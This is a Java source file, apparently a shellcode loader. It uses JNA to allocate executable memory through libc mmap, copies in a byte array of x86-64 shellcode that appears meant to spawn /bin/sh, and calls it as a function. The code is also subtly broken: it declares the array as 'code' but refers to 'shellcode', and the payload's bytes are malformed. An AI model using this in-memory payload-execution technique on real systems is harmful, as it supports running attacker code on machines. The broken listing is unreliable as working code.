import com.sun.jna.*;
import com.sun.jna.ptr.PointerByReference;

public class LinuxShellcodeJNA {
    public interface LibC extends Library {
        LibC INSTANCE = Native.load("c", LibC.class);

        Pointer mmap(Pointer addr, int length, int prot, int flags, int fd, int offset);
        int mprotect(Pointer addr, int len, int prot);
        int syscall(int number, Object... args);
    }

    public static void main(String[] args) {
        byte[] code = new byte[] {
            (byte) 0x48, (byte) 0x31, (byte) 0xd2, (byte) 0x52, (byte) 0x48, 
            (byte) 0xb8, (byte) 0x2f, (byte) 0x62, (byte) 0x69, (byte) 0x6e, 
            (byte) 0x2f, (byte) 0x73, (byte) 0x68, (byte) 0x50, (byte) 0x48, 
            (byte) 0x89, (byte) 0xe7, (byte) 0x52, (byte) 0x57, (byte) 0x48, 
            (byte) 0x89, (byte) 0xe6, (byte) 0x48, (byte) 0x31, (byte) 0xc0, 
            (byte) 0xb0, (byte) 0x3b, (byte) 0x0f, (byte) 0x05
        };

        int PROT_READ = 1;
        int PROT_WRITE = 2;
        int PROT_EXEC = 4;
        int MAP_PRIVATE = 2;
        int MAP_ANONYMOUS = 0x20;

        // Allocate memory
        Pointer memory = LibC.INSTANCE.mmap(null, shellcode.length, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (Pointer.nativeValue(memory) == -1) {
            System.err.println("Memory allocation failed");
            return;
        }

        // Write shellcode to allocated memory
        memory.write(0, shellcode, 0, shellcode.length);

        // Execute shellcode
        com.sun.jna.Function function = Function.getFunction(memory);
        function.invoke(Void.class);
    }
}
